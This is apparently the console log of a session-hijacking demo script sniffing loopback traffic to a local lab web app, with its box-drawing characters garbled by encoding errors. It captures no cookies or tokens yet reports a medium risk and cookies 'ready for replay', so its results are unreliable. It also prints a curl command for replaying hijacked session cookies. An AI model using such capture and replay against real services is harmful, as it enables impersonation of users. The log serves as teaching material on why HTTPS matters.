â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     ADVANCED SESSION HIJACKING ATTACK                        â•‘
â•‘     Real-Time Cookie Theft & Token Extraction                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Target: 127.0.0.1:3003
Timestamp: Mon Nov  3 13:17:40 UTC 2025
Capture Duration: 45 seconds
Attack Type: Man-in-the-Middle (Passive Sniffing)

[PHASE 1] Starting Advanced Packet Capture
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[*] Capturing on loopback interface (lo)...
[*] Filter: tcp port 3003
[*] Duration: 60 seconds (with active traffic generation)

[*] Initializing packet capture...
[PHASE 2] Generating Traffic & Stealing Sessions
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[*] Simulating user activity to capture active sessions...

[*] Intercepting login attempt...
[*] Capturing product browsing session...
[*] Intercepting basket operations...
[*] Capturing API token exchange...
[*] Continuing traffic generation for 40 more seconds...
[+] Traffic generation complete
[*] Waiting for packet capture to complete...

[PHASE 3] Deep Packet Analysis & Session Extraction
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[*] Analyzing captured packets with Python/TShark...

[*] Analyzing captured packets with TShark...

[+] Analysis complete!
[+] Cookies captured: 0
[+] Tokens captured: 0
[+] Vulnerabilities found: 0
[+] Risk Level: MEDIUM

[PHASE 4] Vulnerability Assessment
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

â•â•â• ATTACK STATISTICS â•â•â•
  total_cookies: 0
  total_tokens: 0
  total_credentials: 0
  total_vulnerabilities: 0
  unique_cookies: 0
  critical_vulns: 0
  high_vulns: 0
  medium_vulns: 0

â•â•â• CAPTURED COOKIES â•â•â•

â•â•â• CAPTURED TOKENS â•â•â•

â•â•â• CRITICAL VULNERABILITIES â•â•â•

â•â•â• RISK ASSESSMENT â•â•â•
  overall_risk: MEDIUM
  exploitability: Moderate
  impact: Limited session access

â•â•â• EXPLOITATION PROOF â•â•â•
âœ“ 0
0 session cookies captured and ready for replay
âœ“ Cookies saved to: /workspaces/cns/artifacts/session-cookies-127.0.0.1-20251103-131740.txt

Attack demonstration:
  curl -b '/workspaces/cns/artifacts/session-cookies-127.0.0.1-20251103-131740.txt' http://127.0.0.1:3003/api/Challenges
  ^ This would replay the hijacked session

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                   ATTACK COMPLETED                           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“Š ARTIFACTS GENERATED:
   â€¢ Full Report:    /workspaces/cns/artifacts/session-hijack-127.0.0.1-20251103-131740.txt
   â€¢ Packet Capture: /workspaces/cns/artifacts/session-hijack-127.0.0.1-20251103-131740.pcap
   â€¢ JSON Analysis:  /workspaces/cns/artifacts/session-hijack-127.0.0.1-20251103-131740.json
   â€¢ Cookies:        /workspaces/cns/artifacts/session-cookies-127.0.0.1-20251103-131740.txt
   â€¢ Tokens:         /workspaces/cns/artifacts/session-tokens-127.0.0.1-20251103-131740.txt

âš ï¸  WARNING: This demonstrates why HTTPS is mandatory!
âš ï¸  Captured sessions can be replayed to impersonate users!
âš ï¸  All credentials and cookies transmitted in CLEARTEXT!

